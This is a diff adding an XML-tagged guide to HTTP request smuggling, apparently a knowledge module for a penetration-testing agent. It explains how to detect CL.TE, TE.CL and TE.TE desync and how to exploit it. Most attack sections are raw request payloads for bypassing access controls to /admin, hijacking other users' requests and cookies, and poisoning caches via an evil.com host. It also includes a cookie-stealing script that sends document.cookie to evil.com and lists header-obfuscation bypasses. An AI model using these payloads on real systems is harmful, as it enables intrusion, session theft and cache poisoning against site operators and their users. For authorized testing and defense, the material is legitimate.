@@ -1,0 +1,431 @@
+<http_request_smuggling_guide>
+<title>HTTP REQUEST SMUGGLING</title>
+
+<critical>HTTP request smuggling exploits discrepancies between how front-end and back-end servers parse HTTP requests. By crafting ambiguous requests, attackers can bypass security controls, poison web caches, hijack other users' requests, and access unauthorized resources.</critical>
+
+<scope>
+- CL.TE (Content-Length vs Transfer-Encoding): front-end uses CL, back-end uses TE
+- TE.CL (Transfer-Encoding vs Content-Length): front-end uses TE, back-end uses CL
+- TE.TE (Transfer-Encoding obfuscation): both use TE but parse differently
+- HTTP/2 downgrading attacks
+- Request splitting and response splitting
+</scope>
+
+<methodology>
+1. Identify infrastructure: detect proxies, load balancers, and CDNs via headers.
+2. Test for desync by observing timing differences and response anomalies.
+3. Determine vulnerability type (CL.TE, TE.CL, TE.TE) using detection payloads.
+4. Confirm with targeted smuggled requests that alter subsequent responses.
+5. Exploit via cache poisoning, request hijacking, or access control bypass.
+</methodology>
+
+<infrastructure_detection>
+<common_headers>
+{% raw %}
+# Proxy/CDN indicator headers
+Via: 1.1 varnish, 1.1 cloudflare
+X-Forwarded-For: client_ip
+X-Real-IP: client_ip
+X-Cache: HIT | MISS
+X-Cache-Status: HIT
+CF-Ray: 12345abc  # Cloudflare
+X-Amz-Cf-Id: xxx  # CloudFront
+X-Served-By: cache-lax17835  # Fastly
+X-Varnish: 123456789
+Server: nginx, Apache, ATS  # Backend hints
+{% endraw %}
+</common_headers>
+
+<connection_reuse>
+{% raw %}
+# Test if connections are reused (required for smuggling)
+# Send multiple requests on same connection
+# Observe if responses maintain order
+# HTTP/1.1 Keep-Alive is key
+
+Connection: keep-alive
+Keep-Alive: timeout=5, max=1000
+{% endraw %}
+</connection_reuse>
+</infrastructure_detection>
+
+<detection_techniques>
+<cl_te_detection>
+{% raw %}
+# CL.TE: Front-end uses Content-Length, back-end uses Transfer-Encoding
+# Detection payload - causes timeout if vulnerable
+
+POST / HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+
+1
+A
+X
+
+# If vulnerable: back-end waits for more chunks, causes timeout
+# Expected: ~5-10 second delay on vulnerable systems
+{% endraw %}
+</cl_te_detection>
+
+<te_cl_detection>
+{% raw %}
+# TE.CL: Front-end uses Transfer-Encoding, back-end uses Content-Length
+# Detection payload
+
+POST / HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+X
+
+# If vulnerable: 'X' becomes start of next request
+# Expected: immediate response, next request may error/change
+{% endraw %}
+</te_cl_detection>
+
+<te_te_detection>
+{% raw %}
+# TE.TE: Both use Transfer-Encoding but parse differently
+# Test with obfuscated Transfer-Encoding headers
+
+Transfer-Encoding: chunked
+Transfer-Encoding : chunked
+Transfer-Encoding: xchunked
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+Transfer-Encoding:[tab]chunked
+Transfer-Encoding: chunked
+X: X[\n]Transfer-Encoding: chunked
+Transfer-Encoding
+ : chunked
+Transfer-Encoding: chunKed
+
+# Various obfuscation techniques that one server accepts, other ignores
+{% endraw %}
+</te_te_detection>
+
+<timing_detection>
+{% raw %}
+# Timing-based detection
+# Send request with incomplete chunked body
+# Measure if response is delayed (server waiting for complete body)
+
+POST / HTTP/1.1
+Host: target.com
+Transfer-Encoding: chunked
+Content-Length: 4
+
+1
+A
+
+# If Transfer-Encoding is processed: timeout waiting for 0\r\n chunk
+# If Content-Length is processed: immediate response (4 bytes received)
+{% endraw %}
+</timing_detection>
+</detection_techniques>
+
+<exploitation_techniques>
+<cl_te_exploitation>
+{% raw %}
+# CL.TE: Smuggle request to back-end
+# Front-end sees Content-Length: 13 (forwards full body)
+# Back-end sees chunked encoding, processes until 0\r\n
+
+POST / HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: target.com
+
+# The "GET /admin" becomes a separate request on the back-end
+# Bypasses front-end access controls on /admin
+{% endraw %}
+</cl_te_exploitation>
+
+<te_cl_exploitation>
+{% raw %}
+# TE.CL: Smuggle request
+# Front-end processes chunked encoding
+# Back-end uses Content-Length, leaves extra data in buffer
+
+POST / HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+
+2e
+GET /admin HTTP/1.1
+Host: target.com
+
+
+0
+
+
+# Back-end only reads 4 bytes, smuggled request waits in buffer
+{% endraw %}
+</te_cl_exploitation>
+
+<te_te_exploitation>
+{% raw %}
+# TE.TE: Exploit parsing differences
+# Use obfuscation that one server accepts, other ignores
+
+POST / HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 4
+Transfer-Encoding: chunked
+Transfer-encoding: identity
+
+2e
+GET /admin HTTP/1.1
+Host: target.com
+
+
+0
+
+
+{% endraw %}
+</te_te_exploitation>
+</exploitation_techniques>
+
+<attack_scenarios>
+<access_control_bypass>
+{% raw %}
+# Bypass front-end access restrictions
+# Front-end blocks /admin, smuggled request reaches back-end directly
+
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 54
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/delete?user=victim HTTP/1.1
+Host: target.com
+
+{% endraw %}
+</access_control_bypass>
+
+<request_hijacking>
+{% raw %}
+# Capture another user's request
+# Smuggled request waits with incomplete body
+# Next user's request becomes body of smuggled request
+
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 80
+Transfer-Encoding: chunked
+
+0
+
+POST /log HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 200
+
+data=
+
+# Another user's request becomes value of 'data' parameter
+# Including their cookies and headers
+{% endraw %}
+</request_hijacking>
+
+<cache_poisoning>
+{% raw %}
+# Poison cache with smuggled response
+# Smuggle request that triggers redirect/error on cacheable URL
+
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 70
+Transfer-Encoding: chunked
+
+0
+
+GET /static/app.js HTTP/1.1
+Host: evil.com
+
+
+# Back-end redirects to evil.com (different Host header)
+# Response is cached for /static/app.js
+# Subsequent users get poisoned response
+{% endraw %}
+</cache_poisoning>
+
+<open_redirect_exploitation>
+{% raw %}
+# Use open redirect with smuggling
+# Smuggle request to redirect endpoint
+
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 80
+Transfer-Encoding: chunked
+
+0
+
+GET /redirect?url=https://evil.com HTTP/1.1
+Host: target.com
+
+
+# Next user gets redirected to attacker's site
+{% endraw %}
+</open_redirect_exploitation>
+
+<credential_stealing>
+{% raw %}
+# Steal credentials via reflected XSS + smuggling
+# Smuggle request to endpoint that reflects input
+
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 150
+Transfer-Encoding: chunked
+
+0
+
+POST /search HTTP/1.1
+Host: target.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 100
+
+q=<script>fetch('//evil.com?c='+document.cookie)</script>
+
+# Response with XSS is served to next user
+{% endraw %}
+</credential_stealing>
+</attack_scenarios>
+
+<http2_downgrade>
+<h2_smuggling>
+{% raw %}
+# HTTP/2 to HTTP/1.1 downgrade attacks
+# Front-end uses HTTP/2, back-end receives HTTP/1.1
+
+# HTTP/2 request with smuggled CL
+:method: POST
+:path: /
+:authority: target.com
+content-length: 0
+
+GET /admin HTTP/1.1
+Host: target.com
+
+# HTTP/2 header injection
+:method: GET
+:path: / HTTP/1.1\r\nHost: evil.com\r\n\r\nGET /admin
+:authority: target.com
+
+# Body injection via HTTP/2
+# Send body larger than content-length indicates
+{% endraw %}
+</h2_smuggling>
+
+<h2c_smuggling>
+{% raw %}
+# HTTP/2 cleartext upgrade smuggling
+# Upgrade: h2c header processing differences
+
+GET / HTTP/1.1
+Host: target.com
+Upgrade: h2c
+HTTP2-Settings: AAMAAABkAARAAAAAAAIAAAAA
+Connection: Upgrade, HTTP2-Settings
+
+# If proxy doesn't understand h2c, may forward malicious request
+{% endraw %}
+</h2c_smuggling>
+</http2_downgrade>
+
+<bypass_techniques>
+<te_obfuscation>
+{% raw %}
+# Transfer-Encoding obfuscation techniques
+Transfer-Encoding: chunked                    # Standard
+Transfer-Encoding : chunked                   # Space before colon
+Transfer-Encoding: xchunked                   # Invalid value (may be ignored)
+Transfer-Encoding: chunked
+Transfer-Encoding: x                          # Duplicate header
+Transfer-Encoding:[tab]chunked                # Tab instead of space
+Transfer-Encoding:
+ chunked                                      # Line folding (obsolete)
+X-Ignored: ignored\r\nTransfer-Encoding: chunked  # Header injection
+Transfer-Encoding:chunked                     # No space
+transfer-encoding: chunked                    # Lowercase
+Transfer-Encoding: CHUNKED                    # Uppercase
+Transfer-Encoding: chunked, identity          # Multiple values
+{% endraw %}
+</te_obfuscation>
+
+<chunk_extension>
+{% raw %}
+# Chunk extensions (after size, before CRLF)
+5;ext=value
+hello
+0
+
+# Some parsers ignore extensions, others may fail
+5;malicious=payload\r\nX-Injected: header
+hello
+0
+{% endraw %}
+</chunk_extension>
+</bypass_techniques>
+
+<validation>
+1. Demonstrate desync via timing differences or response anomalies.
+2. Confirm vulnerability type (CL.TE, TE.CL, TE.TE) with specific payloads.
+3. Show successful smuggling by accessing restricted resources.
+4. Prove impact via request hijacking or cache poisoning.
+5. Document exact headers and body required for exploitation.
+</validation>
+
+<false_positives>
+- Single-server configurations (no proxy/CDN)
+- Servers with identical HTTP parsing
+- HTTP/2 end-to-end (no downgrade)
+- Infrastructure that normalizes conflicting headers
+- Connection-per-request (no keep-alive)
+- Rate limiting or WAF blocking malformed requests
+</false_positives>
+
+<impact>
+- Web cache poisoning affecting all users
+- Session hijacking and credential theft
+- Access control bypass to administrative functions
+- Request routing manipulation
+- Partial credential harvesting from other users
+- Exploitation of backend-only vulnerabilities
+</impact>
+
+<pro_tips>
+1. Test during low-traffic periods to avoid affecting other users.
+2. Use unique markers in smuggled requests to identify responses.
+3. Test all Transfer-Encoding obfuscation variants systematically.
+4. Check HTTP/2 downgrade scenarios when HTTP/2 is supported.
+5. Document the exact timing required to exploit timing windows.
+6. Consider chained attacks: smuggling + SSRF, smuggling + cache.
+7. Test with different HTTP clients; some normalize requests.
+8. Look for infrastructure that processes requests differently (CDN vs origin).
+9. Use TCP session management to ensure connection reuse.
+10. Be cautious in production; smuggling can desync legitimate traffic.
+</pro_tips>
+
+<remember>Request smuggling exploits the fundamental ambiguity in HTTP parsing. When two servers disagree on where one request ends and another begins, attackers can inject requests that bypass all front-end controls. The vulnerability exists in the infrastructure, not the application.</remember>
+</http_request_smuggling_guide>
